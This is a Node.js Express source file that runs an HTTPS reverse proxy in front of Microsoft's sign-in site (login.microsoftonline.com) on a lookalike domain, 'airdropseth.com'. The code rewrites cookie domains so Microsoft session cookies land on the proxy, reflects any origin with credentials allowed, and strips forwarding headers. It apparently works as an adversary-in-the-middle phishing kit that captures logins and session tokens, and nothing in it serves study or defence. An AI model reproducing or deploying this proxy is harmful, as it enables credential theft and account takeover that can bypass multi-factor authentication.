import express from 'express';
import { createProxyMiddleware } from 'http-proxy-middleware';
import https from 'https';
import fs from 'fs';
import url from 'url';

const app = express();

const TARGET_URL = 'https://login.microsoftonline.com';

// Create the proxy middleware
const proxyMiddleware = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true, // Ensure this is true to rewrite the host header
  secure: true,
  followRedirects: true,
  ws: true, // Enable WebSocket proxying
  cookieDomainRewrite: { '*': '' }, // Rewrite cookie domain to make it work with our proxy
  onProxyReq: (proxyReq, req, res) => {
    // Set the Referer header to the current URL
    const referer = req.headers.referer || `https://${DOMAIN}`;
    proxyReq.setHeader('Referer', referer);

    // If you need to modify other headers, you can do so here
    // Example: proxyReq.setHeader('Custom-Header', 'value');
  },
  onProxyRes: (proxyRes, req, res) => {
    const headersToRemove = ['x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto'];
    headersToRemove.forEach((headerName) => {
      delete proxyRes.headers[headerName];
    });

    // Dynamically set the Access-Control-Allow-Origin header
    const origin = req.headers.origin;
    if (origin) {
      res.setHeader('Access-Control-Allow-Origin', origin);
    } else {
      res.setHeader('Access-Control-Allow-Origin', '*'); // Fallback to allow all origins
    }

    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, content-type, authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  },
});

// Handle preflight requests
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, content-type, authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// Use the proxy for all routes
app.use('/', proxyMiddleware);

const PORT = 443;
const DOMAIN = 'airdropseth.com'; // Your domain name

// Create HTTPS server
const httpsOptions = {
  key: fs.readFileSync('crt.key'),  // Update this path
  cert: fs.readFileSync('crt.crt')  // Update this path
};

https.createServer(httpsOptions, app).listen(PORT, () => {
  console.log(`Reverse proxy server running on https://${DOMAIN}`);
});
